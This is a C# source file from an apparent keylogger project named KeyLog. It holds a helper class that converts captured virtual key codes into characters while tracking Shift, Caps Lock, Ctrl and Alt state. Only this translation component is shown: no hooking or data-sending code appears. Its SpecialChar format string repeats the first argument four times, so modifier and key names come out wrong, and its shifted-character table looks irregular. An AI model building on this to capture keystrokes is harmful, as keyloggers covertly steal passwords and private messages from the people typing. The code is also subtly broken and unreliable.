using System.Windows.Forms;
using KeyLog.WindowsApi;


namespace KeyLog.Common {
  class KbdChar {

    // Data
    static VK OldKey;
    static bool[] Key;
    static char[] ShiftedNum = {
      ' ', '!', '\"', '#', '$', '%', '&', '\"', '(', ')',
      '*', '+', '<', '_', '>', '?', ')', '!', '@', '#',
      '$', '%', '^', '&', '*', '(', ':', ':', '<', '+',
      '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
      'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',
      'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '{',
      '|', '}', '^', '_', '~', 'A', 'B', 'C', 'D', 'E',
      'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
      'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
      'Z', '{', '|', '}', '~', ' '
    };


    // Properties
    static bool Scroll {
      get { return Key[(int) VK.SCROLL]; }
    }
    static bool Caps {
      get { return Key[(int) VK.CAPITAL]; }
    }
    static bool Num {
      get { return Key[(int) VK.NUMLOCK]; }
    }
    static bool Ctrl {
      get { return Key[(int) VK.LCONTROL] | Key[(int) VK.RCONTROL]; }
    }
    static bool Alt {
      get { return Key[(int) VK.LMENU] | Key[(int) VK.RMENU]; }
    }
    static bool Shift {
      get { return Key[(int) VK.LSHIFT] | Key[(int) VK.RSHIFT]; }
    }
    static bool Shifted {
      get { return Caps ^ Shift; }
    }


    // Checks if character is visible.
    static bool IsVisible(char c) {
      return c >= ' ' && c <= '~';
    }


    // Give the lower case form of character.
    static char LowerCase(char c) {
      return c >= 'A' && c <= 'Z' ? (char) (c - 'A' + 'a') : c;
    }


    // Is it a Toggle key?
    static bool IsToggleKey(VK k) {
      return k == VK.SCROLL || k == VK.CAPITAL || k == VK.NUMLOCK;
    }


    // Is it a Special key?
    static bool IsSpecialKey(VK k) {
      return k == VK.LSHIFT || k == VK.RSHIFT || k == VK.LCONTROL || k == VK.RCONTROL || k == VK.LMENU || k == VK.RMENU;
    }


    // Initialize
    public static void Init() {
      Key = new bool[256];
    }


    // Get character representation of virtual key.
    public static string Char(uint vkCode, bool active) {
      // update old key
      VK k = (VK) vkCode;
      bool diff = OldKey != k;
      OldKey = active ? k : (VK) 0;
      // update key state
      if (!IsToggleKey(k))
        Key[vkCode] = active;
      else if (active && diff)
        Key[vkCode] = !Key[vkCode];
      // get string format
      if (!active || (IsSpecialKey(k) && !diff)) return "";
      char c = (char) User32.MapVirtualKey(vkCode, MapVK.MAPVK_VK_TO_CHAR);
      if (Ctrl || Alt || (Shift && !IsVisible(c))) return SpecialChar(vkCode);
      return NormalChar(c);
    }


    static string NormalChar(char c) {
      return (Shifted ? c : LowerCase(c)).ToString();
    }

    static string SpecialChar(uint vkCode) {
      return string.Format(" [{0}{0}{0}{0}] ",
        Ctrl?  "Ctrl+"  : "",
        Alt?   "Alt+"   : "",
        Shift? "Shift+" : "",
        (Keys) vkCode);
    }
  }
}
